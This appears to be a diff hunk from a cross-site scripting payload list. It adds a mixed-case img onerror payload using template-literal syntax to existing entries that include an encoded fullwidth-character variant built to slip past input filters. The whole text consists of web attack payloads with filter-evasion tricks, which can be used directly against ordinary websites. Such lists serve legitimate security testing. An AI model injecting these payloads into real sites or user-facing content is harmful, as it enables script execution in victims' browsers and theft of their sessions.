@@ -7,3 +7,4 @@
 <img/src='x'/onerror=alert(document.domain)>
 h%uff1cimg%20src%uff1d%20x%20onerror%uff1d%20confirm%28document.domain%29%uff1e
 ';alert(document.domain)\/\/315"
+<img src=1 oNeRrOr=alert`1`>
